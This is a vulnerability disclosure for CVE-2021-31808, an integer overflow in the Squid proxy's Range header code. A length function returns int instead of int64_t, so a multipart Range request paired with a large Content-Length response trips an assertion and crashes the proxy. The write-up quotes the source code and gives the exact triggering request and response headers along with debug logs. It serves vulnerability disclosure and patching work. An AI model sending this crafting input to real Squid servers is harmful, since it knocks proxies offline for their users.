# Integer Overflow in Range Header
The HTTP request header 'Range' is used when a client wishes to partially download (also known as *byte serving*) a file from a compliant HTTP server (RFC 7233 states that Range header handling is optional in HTTP/1.1). Examples for usage include resuming downloads, segmented updates, and video playback (being able to skip to the middle of a video without downloading the whole video first).

Squid is able to handle both multi-part ranges (such as, bytes 0-50 AND 100-150), and single part ranges (bytes 0-50 ONLY), and their subsequent '206 Partial Content' responses.

When Squid handles some requests with the `Range` header, it changes the `Content-Type` of the response to a `multipart/byteranges` response, which involves adding its own custom boundary, and re-calculating the `Content-Length` header as needed.

## The Issue
When a request is made with the `Range` header, the resulting *response*'s headers are parsed for its `Content-Length` in order to determine the "*full size*" of the content which *will* be served (say as a Squid-generated `206 Partial Content` response). The calculations for this procedure is handled in the function `ClientHttpRequest::mRangeCLen`, which is defined as the following (with a lot of content truncated):
```
int
ClientHttpRequest::mRangeCLen()
{
    int64_t clen = 0;
    HttpHdrRange::iterator pos = request->range->begin();
    while (pos != request->range->end()) {
        /* account for headers for this range */
        clientPackRangeHdr(&storeEntry()->mem().freshestReply(),
                           *pos, range_iter.boundary, &mb); // adds a custom Squid multipart boundary.
        clen += mb.size; // 
        /* account for range content */
        clen += (*pos)->length; // adds the content-length from the response header
        ++pos;
    }
    return clen;
}
```

The issue here is that despite the fact that calculations for the "*new*" `Content-Length` are using a 64-bit `int64_t` type, the function returns an `int` type, and thus an integer overflow is trivial.

This has implications in the `Http::Stream::buildRangeHeader` functions, which uses `ClientHttpRequest::mRangeCLen()` as follows:
```
void
Http::Stream::buildRangeHeader(HttpReply *rep) {
…
        int64_t actual_clen = -1;
…
            /* multipart! */
            /* generate boundary string */
            http->range_iter.boundary = http->rangeBoundaryStr();
            /* delete old Content-Type, add ours */
            hdr->delById(Http::HdrType::CONTENT_TYPE); 
            httpHeaderPutStrf(hdr, Http::HdrType::CONTENT_TYPE,
                              "multipart/byteranges; boundary=\"" SQUIDSTRINGPH "\"",
                              SQUIDSTRINGPRINT(http->range_iter.boundary));
            actual_clen = http->mRangeCLen();

            /* http->out needs to start where we want data at */
            http->out.offset = http->range_iter.currentSpec()->offset;
        }
        /* replace Content-Length header */
        assert(actual_clen >= 0);
…
}
```
As we can see, the number which `mRangeCLen` returns is used as an `int64_t` type, which, if negative, will cause an assertion.
Due to `mRangeCLen` returning an `int` rather than `int64_t`, it is trivial to cause this assertion with a specific request and reply.

With the request headers:
```
GET http://example.com/ HTTP/1.1\r\nRange: bytes=0-0,214743639-\r\n\r\n
```

and the response headers:
```
HTTP/1.1 200 OK\r\nContent-Length: 21474836480\r\n\r\n
```
the assertion will hit (debugging information provided for convenience):
```
2021/04/18 22:40:25.522| 64,3| HttpHdrRange.cc(388) canonize: HttpHdrRange::canonize: started with 2 specs, clen: 21474836480
2021/04/18 22:40:25.522| 64,5| HttpHdrRange.cc(124) outputInfo: HttpHdrRangeSpec::canonize: have: [0, 1) len: 1
2021/04/18 22:40:25.522| 64,5| HttpHdrRange.cc(124) outputInfo: HttpHdrRangeSpec::canonize: done: [0, 1) len: 1
2021/04/18 22:40:25.522| 64,5| HttpHdrRange.cc(124) outputInfo: HttpHdrRangeSpec::canonize: have: [214743639, 214743638) len: -1
2021/04/18 22:40:25.522| 64,5| HttpHdrRange.cc(124) outputInfo: HttpHdrRangeSpec::canonize: done: [214743639, 21474836480) len: 21260092841
2021/04/18 22:40:25.522| 64,3| HttpHdrRange.cc(358) getCanonizedSpecs: found 0 bad specs
2021/04/18 22:40:25.522| 64,3| HttpHdrRange.cc(343) merge: HttpHdrRange::merge: had 2 specs, merged 0 specs
2021/04/18 22:40:25.522| 64,3| HttpHdrRange.cc(393) canonize: HttpHdrRange::canonize: finished with 2 specs
2021/04/18 22:40:25.522| 33,3| Stream.cc(484) buildRangeHeader: range spec count: 2 virgin clen: 21474836480
2021/04/18 22:40:25.523| 24,6| SBuf.cc(99) assign: SBuf4710 from c-string, n=4294967295)
2021/04/18 22:40:25.523| 33,5| client_side.cc(758) clientPackRangeHdr: appending boundary: squid/6.0.0-VCS:020000000000000055EE0D0000000000
2021/04/18 22:40:25.523| 24,6| SBuf.cc(99) assign: SBuf4712 from c-string, n=4294967295)
2021/04/18 22:40:25.523| 33,6| client_side.cc(802) mRangeCLen: clientMRangeCLen: (clen += 94 + 1) == 95
2021/04/18 22:40:25.523| 33,5| client_side.cc(758) clientPackRangeHdr: appending boundary: squid/6.0.0-VCS:020000000000000055EE0D0000000000
2021/04/18 22:40:25.523| 24,6| SBuf.cc(99) assign: SBuf4714 from c-string, n=4294967295)
2021/04/18 22:40:25.524| 33,6| client_side.cc(802) mRangeCLen: clientMRangeCLen: (clen += 112 + 21260092841) == 21260093048
2021/04/18 22:40:25.524| 33,6| client_side.cc(747) clientPackTermBound: buf offset: 56
2021/04/18 22:40:25.524| assertion failed: Stream.cc:529: "actual_clen >= 0"
    current master transaction: master53
```

Note: this bug was found by both us and the Squid developers, albeit in different contexts. The Squid developers discovered this bug while fixing another bug, while we discovered it slightly afterwards during some haphazard automated testing.

This bug was assigned [CVE-2021-31808](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31808)

